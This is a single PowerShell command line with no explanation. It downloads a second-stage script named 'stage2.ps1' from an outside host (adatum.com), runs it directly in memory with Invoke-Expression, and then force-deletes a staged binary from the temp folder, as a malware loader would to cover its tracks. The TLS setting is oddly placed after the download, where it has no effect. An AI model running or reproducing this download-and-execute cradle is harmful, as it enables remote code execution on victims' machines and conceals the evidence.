
$DownloadUrl = 'https://adatum.com/stage2.ps1'; Invoke-Expression (New-Object System.Net.WebClient).DownloadString($DownloadUrl); [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
